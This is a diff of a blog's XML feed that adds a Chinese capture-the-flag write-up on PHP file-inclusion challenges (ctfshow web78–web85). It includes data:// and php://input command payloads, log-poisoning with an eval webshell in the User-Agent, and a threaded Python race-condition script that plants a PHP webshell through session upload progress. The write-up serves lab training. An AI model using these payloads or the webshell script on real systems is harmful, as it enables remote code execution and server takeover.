@@ -7808,7 +7808,7 @@
 <p>4.上传文件然后用bp抓包，加上poc执行命令，然后发送</p>
 <p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930351348-50661fd2-280a-40ee-9b87-e304bceceb02.png" alt="img"></p>
 <p>看到flag.php了，修改php文件命令继续上传</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/49879210/1729930528011-c8cc956f-2e2d-45f0-9afd-b64644576961.png" alt="img"></p>
+<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930528011-c8cc956f-2e2d-45f0-9afd-b64644576961.png" alt="img"></p>
 <p>拿到flag！</p>
 <h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930831607-9a87b068-075d-4221-89c7-adac1f189207.webp" alt="image.png"></p>
 <p>先看看能用哪些字符</p>
@@ -8058,6 +8058,250 @@
       </categories>
       <tags>
         <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web入门文件包含篇-ctfshow</title>
+    <url>/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/</url>
+    <content><![CDATA[<h1 id="0x01基础知识"><a href="#0x01基础知识" class="headerlink" title="0x01基础知识"></a>0x01基础知识</h1><h2 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h2><p>文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例,常用的文件包含函数有以下四种</p>
+<p>include(),require(),include_once(),require_once()</p>
+<p>区别如下:</p>
+<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行</p>
+<p>include():找不到被包含的文件只会产生警告，脚本继续执行</p>
+<p>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+<p>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
+<p>具体参考<a href="https://blog.csdn.net/m0_46467017/article/details/126380415">文件包含漏洞全面详解-CSDN博客</a></p>
+<h1 id="0x02题目"><a href="#0x02题目" class="headerlink" title="0x02题目"></a>0x02题目</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png" alt="img"></p>
+<p>典型的文件包含</p>
+<h3 id="include-函数"><a href="#include-函数" class="headerlink" title="include()函数"></a>include()函数</h3><p>我们先直接来看一个简单的例子，网页代码如下:</p>
+<p>include $_GET[‘test’];</p>
+<p>?&gt;</p>
+<p>在创建一个phpinfo.php页面，代码如下:</p>
+<p>phpinfo();</p>
+<p>?&gt;</p>
+<p>利用文件包含，我们通过include函数来执行phpinfo.php页面，成功解析</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028552672-faeaf693-6c55-41b2-a95e-18bc0895469b.png" alt="img"></p>
+<p>将phpinfo.php文件后缀改为txt,jpg后进行访问，依然可以解析</p>
+<p>可以看出<strong>，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来</strong>。(原作者给出来的解释，我验证了也是相同的结论)</p>
+<p>所以回到代码中，这段代码意思是:include就是包含文件的函数，把后面的内容包含进来.可以把file参数指向的文件内容嵌入到当前位置。</p>
+<p>所以我们采用伪协议去做</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p>做法:</p>
+<p>做法一:采用data伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data:&#x2F;&#x2F;伪协议"></a>data:&#x2F;&#x2F;伪协议</h4><p>data:&#x2F;&#x2F; 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，<strong>当它与include()包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
+<p>做法二:采用filiter</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</p>
+<p><strong>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行</strong>。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</p>
+<p>协议参数</p>
+<p>名称	                                                                     描述</p>
+<p>resource&#x3D;&lt;要过滤的数据流&gt;	这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
+<p>read&#x3D;&lt;读链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write&#x3D;&lt;写链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>&lt;；两个链的筛选列表&gt;	任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</p>
+<p>常用：</p>
+<p><strong>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</strong></p>
+<p>利用filter协议读文件±，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</p>
+<p>做法三:用input伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=php://input并提交POST请求包数据:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>(可以用hackbar提交也可以用burpsuite进行提交)</p>
+<p>把传递方式改成POST方式，再添加php代码</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730285657191-4bfa4190-aaad-47f5-bdd2-6eb3ad56f460.png" alt="img"></p>
+<h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>php:&#x2F;&#x2F;input    是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。</p>
+<h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png" alt="img"></p>
+<p>题目过滤了php，所以我们应该绕过php</p>
+<h3 id="采用通配符绕过"><a href="#采用通配符绕过" class="headerlink" title="采用通配符绕过"></a>采用通配符绕过</h3><p>配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符 实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。</p>
+<table>
+<thead>
+<tr>
+<th>*</th>
+<th>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?</td>
+<td>匹配任何一个字符（不在括号内时）?代表任意1个字符</td>
+</tr>
+<tr>
+<td>[abcd ]</td>
+<td>匹配指定字符范围内的任意单个字符</td>
+</tr>
+<tr>
+<td>[a-z]</td>
+<td>表示范围a到z，表示范围的意思</td>
+</tr>
+</tbody></table>
+<p>做法一:data 通配符绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=data://text/plain,&lt;?=system(&#x27;tac flag.???&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意:如果是用?进行匹配，需要写成flag.???,如果是用<em>的话只需要fla</em>就行，因为*是匹配多个字符的，?只能匹配一个字符</p>
+<h3 id="php之"><a href="#php之" class="headerlink" title="php之"></a>php之<?= ?></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;? ?&gt;`相当于对`&lt;?php ?&gt;`的替换。而`&lt;?= ?&gt;`则是相当于`&lt;?php echo ... ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="采用大小写绕过"><a href="#采用大小写绕过" class="headerlink" title="采用大小写绕过"></a>采用大小写绕过</h3><p>做法二:<strong>input协议 大小写绕过</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;ls&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">?file=PhP://input</span><br><span class="line"></span><br><span class="line">&lt;?PhP system(&#x27;tac flag*&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>以上两种方法都是可以绕过的，主要是看想用哪个</p>
+<h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730032976505-90251105-1c5f-4a94-b1bd-9ece517a5765.png" alt="img"></p>
+<p>这次data和php都被过滤了，由于不确定flag的位置，所以我们用input协议</p>
+<p>?file&#x3D;Php:&#x2F;&#x2F;input上交然后用burpsuite抓包，并用POST提交一个&lt;?&#x3D;system(‘ls’);?&gt;</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730033474959-2d0a9681-3616-46dc-9aff-da7c9efb43b4.png" alt="img"></p>
+<p>换成tac fl0g.???就可以了，也可以用大小写绕过</p>
+<p>还可以用日志注入:</p>
+<h3 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h3><p>日志包含漏洞的成因还是服务器没有进行严格的过滤 ，导致用户可以进行任意文件读取，</p>
+<p>但是前提是服务器需要开启了记录日志的功能才可以利用这个漏洞。</p>
+<p>对于Apache，日志存放路径：&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>对于Ngnix，日志存放路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 和 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>中间件的日志文件会保存网站的访问记录,比如HTTP请求行,User-Agent,Referer等客户端信息，如果在HTTP请求中插入恶意代码,那么恶意代码就会保存到日志文件中,访问日志文件的时候，日志文件中的恶意代码就会执行,从而造成任意代码执行甚至获取shell。</p>
+<p>Nginx中的日志分两种，一种是error.log，一种是access.log。error.log可以配置成任意级别，默认级别是error，用来记录Nginx运行期间的处理流程相关的信息；access.log指的是访问日志，用来记录服务器的接入信息（包括记录用户的IP、请求处理时间、浏览器信息等）。</p>
+<p>访问?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>先添加user-agetn:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_GET[2]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>?file=/var/log/nginx/access.log&amp;2=system(&#39;ls /var/www/html&#39;);phpinfo();</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>寻找PHPinfo信息前面的那一段信息即可找到</p>
+<p><strong>url的请求也会被包含进去，所以在url中的马没法执行</strong></p>
+<p>因为：在get请求的数据会被url编码(<code>**&lt;?**</code>)，在进入PHP之前不解码，所以无法当做PHP代码执行</p>
+<h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034742978-a281454d-c022-4ef8-b0fb-0949ae243cc3.png" alt="img"></p>
+<p>这次居然连：都过滤了，那就不能用伪协议了，我们试一下日志注入</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730034980099-331bfbbb-173e-4fd7-bca3-926bf514ad24.png" alt="img"></p>
+<p>发送两次得到文件目录</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035074565-7869069e-1183-4604-b1dc-e2aa014ea974.png" alt="img"></p>
+<p>可以看到里面有flag</p>
+<h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035246928-fd5d12ee-0eee-47db-a364-201f23135f87.png" alt="img"></p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035297273-eaa66c84-0578-4323-bd02-cec7ece1fd69.png" alt="img"></p>
+<p>这次过滤了.符号，意味着日志注入也不可以了，这次只能包含无后缀的文件了，我们php里面无后缀的文件就是session了</p>
+<h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>Session文件包含是一种常见的安全漏洞，它允许攻击者通过包含恶意代码的Session文件来执行代码。这种漏洞的利用通常涉及到对Session的工作原理有深入的理解，以及对PHP配置和服务器环境的熟悉。</p>
+<h4 id="Session的工作原理"><a href="#Session的工作原理" class="headerlink" title="Session的工作原理"></a>Session的工作原理</h4><p>在PHP中，Session是用来保存用户数据的一种方式。当使用<em><strong>session_start()*<strong>函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在</strong>*php.ini**<em>文件中通过</em></strong>session.save_path*<strong>指定。Session文件通常以</strong></em>sess_***为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。</p>
+<h4 id="利用session-upload-progress进行文件包含"><a href="#利用session-upload-progress进行文件包含" class="headerlink" title="利用session.upload_progress进行文件包含"></a><strong>利用session.upload_progress进行文件包含</strong></h4><p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，<strong>最大的好处是，它的值可控；</strong></p>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。</p>
+<h4 id="如何创建session文件呢。"><a href="#如何创建session文件呢。" class="headerlink" title="如何创建session文件呢。"></a>如何创建session文件呢。</h4><p>如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+<p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们<strong>在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO</strong>”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_TGAO里。</p>
+<h4 id="默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。"><a href="#默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。" class="headerlink" title="默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。"></a>默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</h4><h4 id="方法一-借助Burp-Suite"><a href="#方法一-借助Burp-Suite" class="headerlink" title="方法一 | 借助Burp Suite"></a>方法一 | 借助Burp Suite</h4><p>可以在本地写一个上传页面，然后抓包添加<code>Cookie: PHPSESSID=AndyNoel</code>，再用BurpSuite爆破，一边不断发包请求包含恶意的session，一边不断发包以维持恶意session存储。这样就可以利用条件竞争把恶意内容留在session里面了。</p>
+<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现<code>bug</code>。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。说的通俗一点，条件竞争涉及到的就是操作系统中所提到的进程或者线程同步的问题，当一个程序的运行的结果依赖于线程的顺序，处理不当就会发生条件竞争。</p>
+<h4 id="产生条件"><a href="#产生条件" class="headerlink" title="产生条件"></a>产生条件</h4><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730035347028-159bb973-787f-4eb3-9057-2400233642cb.jpeg" alt="img"></p>
+<p>开发人员通过检测文件后缀名，设置白名单黑名单各种方式判断用户上传文件是否为危险文件，一旦发现，就会立马发现。同样的，若是我们在判断和删除事件这一时间差内进行一些操作岂不是也会成功？</p>
+<h3 id="利用PHP-SESSION-UPLOAD-PROGRESS加条件竞争进行文件包含"><a href="#利用PHP-SESSION-UPLOAD-PROGRESS加条件竞争进行文件包含" class="headerlink" title="利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含"></a>利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</h3><p>1.POST请求上传一个文件并抓包</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293603142-e3d26032-d061-411c-9f51-7cefb9e3eff1.png" alt="img"></p>
+<p>这里我们添加一个 Cookie :PHPSESSID&#x3D;flag ，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_flag” （这里我们猜测session文件默认存储位置为&#x2F;tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，修改如下</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730293746433-317ecf29-87ce-4113-8e0b-291f7f102dc5.png" alt="img"></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以在题目url中传参?file&#x3D;&#x2F;tmp&#x2F;sess_flag并抓包，修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294322303-0b2b3651-e7a9-48c8-9eef-2708b8cc036a.png" alt="img"></p>
+<p>然后将两个数据包都开启爆破，爆破结束后查看长度跟其他差距很大的response包，里面就可以看到回显信息</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730294307149-908a8a99-41f9-4eb5-beaa-34fd37f3b919.png" alt="img"></p>
+<p>注意得先进行创建文件的POST包的爆破再进行查看文件的GET包的爆破</p>
+<p>后面改一下一句话木马改一下再重复爆破一次就出来flag了</p>
+<h2 id="web83"><a href="#web83" class="headerlink" title="web83"></a>web83</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730296283509-f13cd684-5eed-4a7a-9faf-134ddea05039.png" alt="img"></p>
+<p>解析一下</p>
+<p>session_destroy(): Trying to destroy uninitialized session in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</strong> on line <strong>14</strong></p>
+<p>在PHP中，<code>session_destroy()</code>函数用于销毁当前会话中的所有数据，并且会话ID也将不再被使用（除非手动重新生成一个新的会话ID）。然而，如果调用<code>session_destroy()</code>之前没有通过<code>session_start()</code>或其他方式初始化Session，就会出现这个警告。</p>
+<p>session_unset()：</p>
+<p>释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件。</p>
+<p>session_destroy()：</p>
+<p>删除当前用户对应的session文件以及释放sessionid</p>
+<p>但我们是自己创建的session，而条件竞争使用的是上传那一瞬间创建的 session，所以不影响。继续上一题的方法，但这里我们要另外讲一个方法</p>
+<h3 id="用脚本"><a href="#用脚本" class="headerlink" title="用脚本:"></a>用脚本:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e4da427a-35da-400b-9d08-7134bc8bdb21.challenge.ctf.show/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">    fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;,</span><br><span class="line">            files=&#123;</span><br><span class="line">                <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=session.post(</span><br><span class="line">            url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">            data=data,</span><br><span class="line">            cookies=&#123;</span><br><span class="line">                <span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">        resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    evnet=threading.Event()</span><br><span class="line">    <span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">    evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300488029-894f411d-ee24-49ee-92a7-d07d0be5da74.png" alt="img">出现这个之后代表竞争成功了</p>
+<p>我们就可以直接访问这个木马然后进行抓包，用POST提交(或者用蚁剑连接更快)</p>
+<p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730300529394-4081f140-02ec-4af6-9752-0690d78d07a4.png" alt="img"></p>
+<p>然后再改成cat fl0g.php就能拿到flag了</p>
+<h2 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730378443258-51ac2e09-3fb8-4d5d-8eab-d0f18e2c08cf.png" alt="img"></p>
+<p><strong>system(rm -rf &#x2F;tmp&#x2F;*); 意思是会删除</strong>该命令会删除（<code>rm</code>）<code>/tmp</code>目录下的所有文件和文件夹（<code>*</code>表示所有内容），并且不会询问确认（<code>-f</code>参数表示强制删除），同时递归地删除所有子目录及其内容（<code>-r</code>参数表示递归删除）。</p>
+<p>但如果我们用脚本去做的话，由于我们爆破的线程开的比较多，在get的请求线程1刚刚删除&#x2F;tem&#x2F;*，在上传的线程1中又写了进去了。简单来说就是，刚刚删除完就写进去了。所以我们可以正常用脚本去进行爆破</p>
+<h2 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h2><p><img src="/./../image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730380946270-8752299b-30ea-48a0-8e64-e2144a8d502b.png" alt="img"></p>
+<p>先来了解一下file_get_contents函数和<strong>strpos函数</strong></p>
+<h3 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h3><p> 是 PHP 中的一个非常实用的函数，它用于将整个文件读入一个字符串中。这个函数非常适合于读取小文件或者当你需要将文件内容作为一个字符串来处理时。</p>
+<p>用法:<br>$content &#x3D; file_get_contents(‘path&#x2F;to&#x2F;your&#x2F;file.txt’);</p>
+<h3 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a><strong>strpos()函数</strong></h3><p><code>strpos</code> 函数是 PHP 中用于查找字符串中特定字符或子字符串首次出现位置的内置函数。</p>
+<p>用法:</p>
+<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
+<ul>
+<li><code>$haystack</code>：目标字符串，即要在其中查找的字符串。</li>
